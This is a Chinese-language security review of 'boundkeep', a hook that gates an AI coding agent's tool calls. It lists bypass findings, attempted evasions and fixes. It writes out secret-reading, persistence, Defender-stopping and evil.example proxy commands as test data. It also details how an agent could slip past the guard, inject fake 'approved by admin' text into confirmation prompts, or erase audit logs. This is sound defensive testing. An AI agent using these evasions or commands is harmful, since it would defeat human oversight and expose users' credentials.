- **L-2** pwsh 7 与解析器不一致（B-03，**未在 pwsh 7 上测**）：`` `u{2e} `` 在 pwsh 7 的双引号字符串里展开成 `.`，在 5.1 里变成字面 `u`；我在 5.1 上看到 `Get-Content ".`u{2e}env"` 是 gray、路径是 `.u{2e}env`，没有 `ps-backtick` 原因。`find_powershell` 只找 `%ProgramFiles%\PowerShell\<版本>\pwsh.exe`，Store / scoop / dotnet-tool 的 pwsh 找不到，于是 boundkeep 用 5.1 解析，而工具可能跑 7。`psaliases.NAMES_DIFFERENT_IN_PS7`（`curl`、`wget`、`sc`）没有任何引用，`sc create svc binPath=…` 在 7 上会被当 `Set-Content` 而非 `windows-persistence-commands`。若辅助进程取到的是 7.x，应当把这三个名字当未知。
- **L-3** 5.1 的解析错误会丢后续命令（B-10）：`echo hi & Get-Content ~\.ssh\id_rsa` → gray `ps-parse-error`，`gc` 没有出现（我复现：gray、只有 `ps-parse-error`）；而 pwsh 7 会把两条都执行。`&&`、`||`、`??`、`?:`、`-Parallel` 仍被 deny。
- **L-4** PowerShell 的常量不传播（B-07；文档缺口 4、5 已列，但"变量里存字面量"是 agent 最常写的形式）：`$f='~\.ssh\id_rsa'; gc $f`（我复现：gray `ps-compound:AssignmentStatementAst`）、`'~\.ssh\id_rsa' | gc`、`gc (Join-Path ~ .ssh\id_rsa)`、`switch -File`。
- **L-5** 嵌套 shell 的文本不分析（B-06、A-005）：`powershell -c 'Remove-Item -Recurse <项目外>'`、`pwsh -c 'Get-Content .env'`、`cmd /c rd /s /q <项目外>` 在 Bash 与 PowerShell 里都是 gray（我复现了 Bash 里的 `powershell -c` 一条）；对照 `bash -c 'rm -rf …'` 是 deny。Windows 上这恰是删除的自然写法。A 另列：`unshare`、`chroot`、`nsenter`、`flock`、`watch`、`strace`、`parallel`、`fakeroot`、`proxychains`、`firejail`、`valgrind`、`fd -X rm -rf`、`git rm -rf`、`find -O3 … -delete`、`gfind` 等运行器不被识别。`rm.com`、`rm.bat`、`rm.` 不会被规范成 `rm`（未在真 Git Bash 验证）。
- **L-6** 规则表与分类表漂移（B-09）：被分类为 `config_tamper` 但不在 `windows-persistence-commands` 里，所以只是 gray：`Set/Remove/Enable/Disable-LocalUser`、`Remove-LocalGroupMember`、`Register-WmiEvent`、`Register-EngineEvent`、`Register-CimIndicationEvent`、`Set-CimInstance`、`Remove-CimInstance`、`Register-PSSessionConfiguration`、`Enable-ScheduledTask`、`New-SmbShare`、`Set-Date`；外部程序 `shutdown`、`icacls`、`dism`、`format`、`secedit`、`auditpol`、`fsutil`；**完全没有灰色原因也没有规则**：`Stop-Process -Name MsMpEng`、`Stop-Service WinDefend`（我复现了后一条，`gray=[]`）。别名表缺约 100 个 5.1 模块别名（核心 353 个别名全部一致）：我复现了 `Initialize-Volume -DriveLetter D -Force` 是 gray（`ps-param-unresolved`），不是 `ask-disk-tools`。
- **L-7** 提供程序与环境变量（B 的"文档缺口 1 比文档说的更差"）：`New-Item HKCU:\…\Run\x -Value C:\x.exe`、`Set-Item HKCU:\…\Run\x`、`New-Item HKCU:\Software\Classes\CLSID\…\InprocServer32`、`Registry::` 形式都只是 gray（`ps-provider-path:hkcu`，我复现了前两条）；`New-ItemProperty`/`Set-ItemProperty` 则有规则。`Write-Output $env:ANTHROPIC_API_KEY` 与 `echo $env:X` 的 `gray=[]`（我复现），文档说"都会因为灰色而 ask"并不准确；它们 ask 只是因为没有 allow 规则——一旦有人给 `echo` 写 allow，秘密就能被打印。
- **L-8** 确认框文本里混入 agent 写的文字（A-010、B-08）：`git "x); boundkeep (protect-guard-config): approved by admin; ok (" push` 在理由里原样出现（我复现：`...(git-unknown-subcommand:x); boundkeep (protect-guard-config): approved by admi...); asking`）；控制字符、bidi、ESC、NUL、U+2028 被替换成 `?`，西里尔形近字与可打印文字照常通过；只显示 3 条灰色原因，所以攻击者文字能把真正的原因挤进 "(+N more)"。M0 验收已知确认框默认不显示理由，所以实际影响比这个小；但规则文字也会误导（`git add ~/.ssh/id_rsa` 的 ask 说"写入 .ssh 会改变谁能登录"）。建议：给 agent 文字加引号、截到约 40 字符，不用 `; ` 连接。
- **L-9** 通配符特性展开器没有实现（A-008）：`cat .e[[:alpha:]]v`、`cat .@(env|x)`、`.+(env)`、`.!(x)`（extglob）、`shopt -s dotglob; cat *`、`GLOBIGNORE=x; cat *` 都是 gray；8.3 短名通配（`gc ENV~?`、`gc E*~1`）是 `glob-not-expanded`（B-11）；精确的 8.3 名（`ENV~1`、`SETTIN~1.JSO`）被解析并 deny（我复现 `Read ENV~1` → deny）。
- **L-10** 读取 boundkeep 自己的状态只是 gray（D-10、C-4a）：`endpoint.json`、`policy.yaml`、`logs\audit.jsonl` 在项目外所以 ask 而非 allow；`protect-guard-config` 只管写。自定义 `--home` 目录没有规则（只有 `CLAUDE_CONFIG_DIR` 有运行时规则）。我复现了 `Read ~\.boundkeep\endpoint.json`、`audit.jsonl` → gray。
- **L-11** 未覆盖的持久化与"让代码以后运行"的路径（D-11；现在都是 ask，M3 之后需要重新评估）：项目：`package.json`、`Makefile`、`conftest.py`、`pyproject.toml`、`setup.py`、`tox.ini`、`.pre-commit-config.yaml`、`.gitattributes`、`.gitmodules`、`.vscode/extensions.json`、`.vscode/mcp.json`、`.cargo/config.toml`、`Dockerfile`、`docker-compose.yml`、`.gitlab-ci.yml`、`sitecustomize.py`、`*.pth`；Claude：`~/.claude/plugins/**`、`.claude/rules`、`.claude/output-styles`、`.claude/statusline.*`、`managed-settings.json`；用户：`%APPDATA%\pip\pip.ini`（只列了 Linux 的 pip 路径）、`~/.cargo/config.toml`、`~/.gradle/init.d`、`~/.condarc`、`~/.yarnrc*`、`~/.terraformrc`、`~/.aws/config`（写）、VS Code 用户设置、`drivers\etc\hosts`。
- **L-12** 脱敏遗漏（D-9）：令牌形（AKIA…、`gh?_`+36、`sk-`+40）在 96 种写法里 0 次泄露；"像密码的普通值"在 96 种里有 41 种仍以明文留在日志里：变量与赋值名（`$pw`、`$pass`、`$p`、`$auth`、`$env:CREDS`、`MYSQL_PWD=`、`DB_PASS=`、`export AUTH=`、`docker run -e FOO=`、`setx FOO`、`SetEnvironmentVariable('FOO',…)`）、头与请求体（PS 哈希表里的 `Authorization='…'`、`Cookie: session=…`、`curl -b`、`curl -d 'pwd=…'`、`?sig=`）、URL 与位置参数（`https://<token>@host`——无冒号的 userinfo、`aws configure set aws_secret_access_key <v>`、`npm config set //…:_authToken <v>`、`mysql -p <v>`（带空格）、`ssh-keygen -N <v>`、`net use … <pw>`、`echo <v> | gh auth login --with-token`、`curl -u <v>`（无冒号））、base64 或十六进制包装。D 用真守护进程端到端验证：aws 形、`$pw`、`https://<标记>@host`、把标记当 git 子命令、当程序名、当未知 cmdlet 的参数值，都进了 `audit.jsonl`；Bearer 与 GitHub 令牌形不泄露；非 shell 工具的路径与内容从不记录。日志与目录的 ACL 正确（D 用 `icacls` 看到：只有当前用户与 SYSTEM，没有 Everyone / Users / Authenticated Users），所以这是"日志副本"层面的风险。
- **L-13** 日志视图（D-13）：`boundkeep log --json` 原样输出 U+202E、U+2028、U+2029、U+0085（`cli.py:476`；`logstore.py:254` 也原样写入）。审计日志里 `\n`、`\r`、NUL、ESC、退格与 1 MB 命令都保持一条记录一行（命令截到 4096 字符，最长一行 4618 字节，24 行全是合法 JSON，没有裸 ESC/NUL/CR）；文本视图把控制字符与 bidi 换成 `?`。建议 `ensure_ascii=True`。
- **L-14** 审计日志上限与证据丢失（D-14）：8000 个事件、每个 4.5 KB 命令，23 秒内（344/s）让 `audit.jsonl` 与 `.1`–`.5` 合计 30.5 MB 并丢掉第一个事件；同用户进程大约 20 秒就能抹掉历史，没有防篡改。另（我读 `server.py:49–51,447–456`）：超时或 busy 的请求只记命令长度、不记命令文本，所以被"超时降级"的恶意命令在日志里没有内容。
- **L-15** POSIX/WSL 词法（A-011，只用 `--platform posix` 做了词法模拟，非真机）：`/proc/self/root/etc/shadow`、`/proc/1/root/…`、`//etc/shadow`、`/dev/disk/by-id/*`、`dd of=/dev/sg0|pmem0|nbd0|zram0|ram0|fd0|sr0|rbd0` 等都是 gray，预期是 deny（deny 的 glob 锚在 `/etc/shadow*`、`/dev/sd*`，`*` 不跨 `/`）。
- **L-16** 网络（A-012，信息性）：默认下 gray 即 ask，所以 `net-allowlist` 只改变理由句子，M3 之后才有实质区别。灰色但目的地不在白名单的写法：`DOCKER_HOST=tcp://evil.example:2375 docker ps`、`export HTTPS_PROXY=http://evil.example:1; curl https://github.com`（`declare -x`、`set -a` 同）、`gnutls-cli`、`tracert`、`drill`、`mail/sendmail/mutt/msmtp/swaks`、`python3 -m http.server`、`php -S`、awk 的 `/inet/tcp/`、`busybox httpd|ftpget`。其余约 150 个 URL 与主机写法（userinfo、端口、尾随点、IDN、八进制/十六进制/十进制 IP、IPv6、scp 形式、`--resolve`、`--connect-to`、`-x`、`-K`、`@file`、`wget -i`、pip/npm registry、docker、gh、ssh、nc、`/dev/tcp`）都是 ask；93 个 WebFetch URL 技巧里除了真白名单主机外都是 ask。
- **L-17** 假阳性（信息性）：`Get-WinEvent -ListLog *` 在含 `.env` 的项目里被 deny（B-13，未知 cmdlet 的 `*` 按点文件展开）；`xargs rm -rf` 项目内也 deny；路径长于约 2 万字符时匹配所有 deny 规则（我复现：32700 与 40000 字符的 Read 路径是 `deny`；方向安全，但对用户是莫名其妙的拒绝）。
- **L-18** `init` 的文件处理（D-15，信息性）：`.claude` 是联接点时 `init` 写进目标目录；符号链接的 `settings.json` 会被改写目标（`settings_io.py:350` 代码阅读，没有符号链接权限所以没跑）；硬链接会被原子替换打断；已有 hook、键顺序、缩进与 CRLF 保留；BOM 会被去掉并提示；重复运行幂等；JSONC 注释、尾逗号、重复键、5 MB 文件、空文件、UTF-16、顶层数组、`hooks` 不是对象都被拒绝（rc 1，文件不动）。

---

# 3. 尝试过但没有成功的攻击

下列每一项都得到 deny、ask 或带原因的 gray，从未得到 `allow`（除非另行说明）。

**命令混淆（Bash）**——A 约 800 个读 `~/.ssh/id_rsa` 或 `.env` 的变体，我另做 60 个（`SP\M\m7.json`）：`$'..'`、`$".."`、`"$(..)"`、反引号、`\` 续行、引号切断名字（`~/.s''sh`、`~/.s\sh`）、`${X:-}`、`${IFS}`、花括号展开、`?`/`*`/`[...]` 通配（按磁盘展开）、`~`、`$HOME`、`${HOME}`、`$USERPROFILE`、`$(echo ~)`、`~root`、here-doc 与 here-string（所有引号形式、`<<-`、CRLF，未加引号的正文里的 `$(cat …)` 被看到）、进程替换、`$(< f)`、`exec 3<`、`read < f`、`source f`、`env -S`、`command`/`builtin`/`exec`/`nohup`/`time`/`nice`/`timeout`/`stdbuf`/`setsid`/`sudo`/`doas`/`xargs`/`wsl`/`sshpass`/`busybox`/`env -i` 包装、`find -exec` 内部命令、`bash -c`、`eval`、变量里存命令名、同一行定义别名/函数、子 shell、`{ }`、`if/for/while/case`、`|&`、`&&`/`||`、后台 `&`、`cd` 之后用相对路径（164 个 cd 变体）、`pushd`、`HOME=` 前缀赋值、`CAT`/`cat.exe`/`/usr/bin/cat`。读出点全部 deny，或在确实动态时 gray（`for f in ~/.ssh/*; do cat $f; done`、`echo … | xargs cat`、`base64 -d | bash`、`cmd /c type`）。

**程序替代**：`ln`/`cp -l`/`cp`/`mv`/`install`/`rsync`/`tar -C`/`sed -n`/`awk`/`base64`/`curl -F @`/`-T`/`--data-binary @`/`scp`/`nc <`/`openssl -in`/`gpg -c`/`strings`/`diff`/`cmp`/`ssh-keygen -f`/`ssh -i`/`docker run -v`/`head`/`xxd`/`git diff --no-index`/`git --git-dir`/`python -c`（gray）读私钥：deny 或 gray（我的 43 个用例，`SP\M\m5.json`）。`python -c`、`python script.py` 是 gray（exec）。

**写目标**：A 对 12 个目标（`settings*.json`、`.boundkeep`、`.bashrc`、`.git/hooks`、`.gitconfig`、`authorized_keys`、`CLAUDE.md`、PowerShell profile、Startup 文件夹）× 约 150 种写法；D 对 `protect-guard-config` 约 200 个变体（重定向、tee、`sed -i`、cp、mv、ln、dd、`find -exec`、`Set-Content`、`Copy-Item`、`Rename-Item`、`cmd /c`、嵌套 powershell、字面量 `Invoke-Expression`、cd 加相对路径、`~`、`$HOME`、`%USERPROFILE%`、大小写、尾随点或空格、`::$DATA`、`\\?\`、`..`、通配、联接点、已存在路径的 8.3 名）：全部 deny 或按策略 ask。我另测（`m4.json`）：`NotebookEdit`、`MultiEdit`、`Write` 到 `settings.json`/`settings.local.json`/`Settings.JSON`/`settings.json:x`/`settings.json.`/`\\?\` 前缀，全 deny；不存在的 8.3 名 `SETTIN~1.JSO` 是 gray。

**路径技巧（Read/Write/Grep/Glob，Windows 语义）**：`..`、大小写、ADS（`.env::$DATA`、`.env:stream`）、尾随点与空格、已存在的 8.3 名（文件、目录、联接点）、真实联接点（指向 home 与 `.ssh`、指向项目外）的所有写法、`\\?\`、`\\.\`、`\\?\UNC\localhost\C$`、`\\localhost\C$`、`\\COMPUTERNAME\C$`、`\\wsl$`、`GLOBALROOT`、卷 GUID、`\??\`、`/cygdrive`、`/mnt/c`、`/c/…`（MSYS）、`/proc/self/root`、`C:.env`、设备名、同形字（正确地被当作不同的名字）、NUL、`%VAR%`、`proj2` 前缀的兄弟目录、`file://` URL：**没有任何一个让项目外路径变成 `inside_project` 为真**；受保护名字总是 deny。`junction\..\outside\x` 判 `allow` 是对的（Win32 先按字面折叠 `..`）；`Read` 经项目内的联接点读项目外文件与 home 里的秘密：分别是 gray 与 deny（我复现，`m1.json`）。项目根是 home、盘符根或 home 的祖先时，`inside_project` 一律不为真（我复现，`m3.json`：`project_dir` 为 home 与 `C:\` 时 Read home 里的文件是 gray；`event.py:230–271` 的 `_too_broad`）。

**PowerShell**（B 约 1900 个变体、9000 条随机行，0 个异常、0 个 `internal-error`、0 个 allow）：别名（`gc cat type more sls gi gp fhx cp copy mv mi ii saps`）、参数缩写与冒号形式、反引号、大小写、模块限定名、`&`、`.`、`&{}`、`$()`、`@()`、`if/try/foreach/switch/trap/function/filter/workflow/class` 体内的命令、`%`、`?`、`Start-Job`、`Register-ObjectEvent` 的脚本块、`FileSystem::`、`\\?\`、`\\.\`、`\\localhost\C$\`、ADS、驱动器相对、`$env:` 与 `$HOME` 变体含重新赋值、`cd`/`pushd`/`cd..`/`Pop-Location`、真 8.3 名与联接点、通配符、未知 cmdlet 与外部程序带路径（414 个）；项目外删除（130 个变体）、guard 配置、profile、Startup 的写（约 300 个）、持久化工具（`reg`、`schtasks`、`sc.exe`、`New-Service`、`Set/New-ItemProperty`、WMI、`net user`）、网络（约 150 个）、git 强推（约 70 个）、别名与函数遮蔽（190 个）、`iex`、`& iex`、`-enc`、点源、`.ps1`、`cmd /c`、.NET 调用、COM、`Add-Type`：deny/ask/带文档化原因的 gray。参数缩写与真实 5.1 `ResolveParameter` 对照 7356 个 token（36 个 cmdlet）：0 个错、22 个 gray；别名表对 `Get-Command -CommandType Alias`：核心别名全部一致。解析时副作用：`using module <无害 psm1>` 被真实辅助进程解析，没有创建金丝雀文件。`echo x>file`（无空格）：5.1 的 AST 把 `x>file` 当一个裸词，什么也不写，AST 为准。

**辅助进程**（C）：孤立代理项、NUL、伪造的 `{"ready":true}` 或应答形文本都放在一行 base64 里，不能跳出协议；`pshelper.ps1` 的 JSON 输出转义所有非 ASCII 与 `\`、`"`，`psparse._check_reply` 校验容器类型；1 MiB 的 `a;a;a;` 被客户端拒绝（`ps-input-too-large`）；1000–20000 层嵌套最终超时或报错，从不 allow；脚本哈希钉住：在隔离副本里改一行后重启被拒绝（TOCTOU 间隙是文档的缺口 14，利用它需要对安装目录的写权限）；`find_powershell` 从不搜索 `PATH`；`PSModulePath` 劫持（金丝雀模块）无效，且本来就不转发给子进程；`__PSLockdownPolicy` 不在环境白名单里；工作目录是临时目录、`-File` 参数是绝对路径、`-NoProfile`。重复超时不计入熔断：4 次攻击后 `failures=0`（与文档一致）。

**hook 客户端降级矩阵**（C 的清单，用真实子进程 `python -I -S hook_client.py --home <隔离> pre`）：空/空白/非法/截断 JSON、JSON 数组/null/字符串/数字、BOM、非法 UTF-8、GBK 字节（被拒绝，不被误读）、合法的中文与 ✓、NaN/Infinity、5000 位大整数、10 万层嵌套、5000 层 `tool_input` 嵌套、错误类型的 `tool_input`/`command`/`tool_name`、错误或缺失的 `hook_event_name`、与参数不一致、无参数、`--home` 缺子命令、相对或不存在的 `--home`、1 MiB `a ` 命令、7 MB 与 20/50 MB 命令、70 MB stdin（被 64 MiB 上限拒绝）、50 MB Write 内容（正确截掉）、损坏/空/BOM/20 MB/深嵌套 YAML/是目录/缺失的 `policy.yaml`（经真实守护进程）、无效 `mode`、被独占锁住的 `audit.jsonl`（`append` 返回 False，不抛）：**全部退出码 0 或 2，输出合法的 ask/deny/空（post/prompt 型事件）；没有一个是退出码 1 或 PreToolUse 型事件的空输出**。D 另测：持有 stdin 不关（10.08 s 后 ask）、环境里设 `PYTHONPATH`/`PYTHONSTARTUP`/`PYTHONHOME`/`BOUNDKEEP_HOME`/`USERPROFILE`/`BOUNDKEEP_HOOK_BUDGET_S`，全部退出码 0 或 2。M-3 是这个矩阵之外、只在导入失败路径上才出现的唯一例外。

**命名管道**：D 的原始 ctypes DACL 读数只有当前用户；远程 `\\127.0.0.1\pipe\…` 得到 ERROR_ACCESS_DENIED；对照管道没有拒绝远程标志时返回 231，所以标志有效。管道名被预先创建时 `serve` 响亮失败（退出码 1）。冒充者的畸形回答（错 id、70 KB、2001 字符理由、`defer`、无换行、垃圾）都被降成 ask；沉默的冒充者在 10.05 s 后 ask。对守护进程的畸形请求（9 MB 行、无换行的 8 MB、10 万层嵌套、非法 UTF-8、65 字符的 id、`{}`、7 MB 命令）得到 `too_large`/`bad_request`/`timeout`/ask，守护进程保持健康。

**其他**：1 MiB 的各种敌意输入（20 种形状）在 3–310 ms 内返回 gray（A）；5000 与 20000 层 `$(` 在 1 ms 内 `nesting-too-deep`；3 万条随机 token 命令 0 异常、最慢 49 ms；策略只从 `~\.boundkeep\policy.yaml` 加载，不从项目目录加载（我读 `paths.py`），所以恶意仓库不能自带 allow 规则；`strict.yaml` 是 `default.yaml` 的超集，两者的 allow 规则相同（只有 `read-inside-project`；我用脚本比较，`SP\M\cmp.py`）。

---

# 4. 没有覆盖到的范围

- **Claude Code 本身的行为**：BOM / 多余顶层键（#98662）、`allowManagedHooksOnly`、工作区信任、托管设置、`bypassPermissions` 与 `auto` 下 hook 的 `ask` 是否仍生效、另一个 hook 的 `updatedInput`、设置的 `env` 能否覆盖 `CLAUDE_PROJECT_DIR`、VS Code 与桌面应用的界面。H-1 里"Grep 返回 `.env` 内容"一步没有端到端运行过。
- **pwsh 7、Linux、macOS、WSL 真机**（POSIX 只用 `--platform posix` 做了词法模拟）；**Git Bash**；**真 bash 的差分测试**（Docker 守护进程未运行，没有启动它）；MSYS 的 `/c/x` 在 Read 工具方言里是否与 Node 的解释一致（A 提出，未验证）。
- **符号链接**（没有创建权限）：只用联接点、硬链接与 `realpath` 的共同路径推断；NTFS 的大小写敏感目录、`subst`、映射盘、挂载点。
- **第二个 Windows 用户、提权（UAC）连接管道、杀毒软件的行为、`--hook-style launcher`、真实的跨用户 DACL。**
- **管道名在守护进程启动前被抢占的竞态**：只读代码（随机令牌、私有 DACL、首实例标志），C 自己的实验被安全分类器拦下后停止；D 另做了同类实验（H-2）。
- **熔断器的"连续 5 次真实崩溃"端到端**（只读代码，并验证了超时不计入）；**受管机器 `AllSigned`**；**OneDrive 重定向的 Documents**；**真实 CPU 饱和**下辅助进程 0.3 秒预算的行为（B 指出但没有饱和共享机器）。
- **并行工具调用的竞态**（例如同一轮里的 `ln -sf` 与 `Read`，规范化发生在执行之前）：未测。
- **M3 的 LLM 层**（尚不存在）。上面所有"deny 降成灰色"的发现，在 M3 把灰色交给 LLM 之后性质会变，需要重审。
- **子审查者的数字我大多没有逐条复核**；我复核过的在每条里标了"主审复现"。

---

# 5. 对 M1 / M1b 报告与文档的更正

| 位置 | 说法 | 审查结果 |
|---|---|---|
| M1 报告第 6 节 | "不知道 Claude Code 的 Grep 是否加 --hidden" | 2.1.301 的 Grep 参数构造含 `--hidden`；且非隐藏的 `*.pem`、`*.tfstate`、`credentials.json` 也一样被读（H-1） |
| M1 报告第 5 节 | 预算超限返回灰色而不是异常 | 属实，但同时丢掉了触发预算的命令与之后的所有命令（M-1） |
| M1 报告 §3 | 延迟 p95 ≈ 1.45 ms | 只覆盖了典型命令；`evaluate` 没有预算，敌意输入可到秒级（M-2） |
| M1b 报告 §6 / `powershell-dialect.md` 缺口 1 | 注册表、环境变量"只能灰色" | 灰色属实；但 `New-Item`/`Set-Item` 写 `HKCU:\…\Run` 没有任何规则，`$env:X` 的读取甚至没有灰色原因（L-7） |
| 缺口 7 | UNC "被当作普通（项目外）路径" | 实际 `net=False`、`gray=[]`，是外传与 NTLM 泄露的通道（M-12） |
| 缺口 8 | 祖先递归读取只写了 `gci … \| gc` | `Compress-Archive -Path ~`、`xcopy ~ … /s`、`tar cf x ~` 都没有灰色原因（M-9） |
| 缺口 15 | pwsh 7"设计目标，未实测" | 另有 `` `u{HEX} `` 与未使用的 `NAMES_DIFFERENT_IN_PS7` 集合（L-2） |
| M1b 报告 §5 | 辅助进程首次就绪 1.8–2.3 秒 | 本次 C 测得 0.5–0.6 秒（warmup_ms）、B 约 0.8 秒；差异原因未查，不当作文档错 |
| 文档 §4 | "辅助进程失败时已看清的部分仍被匹配" | 5.1 的解析错误可以让后续命令不出现（L-3） |
| 规格 §5.1 / `architecture.md:62` | 随机令牌防止命名管道抢占 | 只对其他用户成立（H-2） |
| CLAUDE.md 不可违反的原则 | `init` 自检与 `doctor` 不是可选项 | 存在，但对 H-3、M-6 的情形无效 |

---

# 6. 结论

**高危没有清零。** 有三条高严重度发现（H-1 有条件，H-2 有条件，H-3 有条件），其中 H-1 是在默认策略下一个标准工具调用就能产生 `allow` 的实际路径。**不应当在没有处理它们的情况下进入 M2。** 好消息是：在约 8700 个 shell 变体、约 1900 个 PowerShell 变体、数百个路径变体中，**没有任何 Bash 或 PowerShell 命令变成 `allow`**，hook 客户端的降级矩阵除 M-3 之外全部以 0 或 2 结束，路径规范化（含联接点、8.3、ADS、`\\?\`、UNC、MSYS）在 allow 侧没有被击穿。问题集中在三处：非 shell 的 allow 规则（H-1、M-11）、客户端对守护进程的无条件信任（H-2）、以及"出问题时 deny 退化为 ask"这一整类（M-1、M-2、M-8–M-10），后者在 M3 之后会变成真绕过。

**进入 M2 之前必须先修：**

1. **H-1**：目录目标的 Grep / Glob 不得在未检查子树时 `allow`；同时把 `*.env`、`.claude/settings.local.json`、`.mcp.json`、`.git/credentials` 等并入保护（M-11）。
2. **H-2**：客户端在 `emit_allow` 关闭时不执行守护进程回答的 `allow`（一行改动）；创建管道实例后收紧 DACL；规格 §3 / §5.1 更正。
3. **H-3**：至少做到 `init` 在项目级安装时明确提示"只对在该目录打开的会话生效"，并且 `doctor` 不再对"被告知的目录"之外的情形沉默；SessionStart 心跳可以放进 M2 的第一批。
4. **M-3**：`_fail_safe` 跳过 `--home <路径>`（并把 `sys.path.insert(0, …)` 改 `append`）；加带 `--home` 的回归测试。

**进入 M3（LLM 接管灰色）之前必须修：** M-1（预算耗尽后继续词法分类）、M-8、M-9、M-10、M-6（ConfigChange 与 `init` 的层检查）、M-4、M-5（给闸门自己的代码、目录与命令行 deny 规则）、M-12。

**建议在 M2 的评测清单里：** M-2（`evaluate` 的预算）、M-7、M-13（在 enforce 下可日常使用）；L-1 至 L-18 逐条取舍。

**需要改规格的条目：** §3 范围外（同用户进程可冒充守护进程）与 §5.1 的令牌表述（H-2）；§7 目录目标读取的 allow 条件（H-1）；§7/§M1 不变量"预算耗尽不削弱已可见的 deny"（M-1）；§10 最后一行"hook 配置层与会话目录不匹配"（H-3）；§6 / 核心承诺"enforce 下可日常使用"（M-13）。
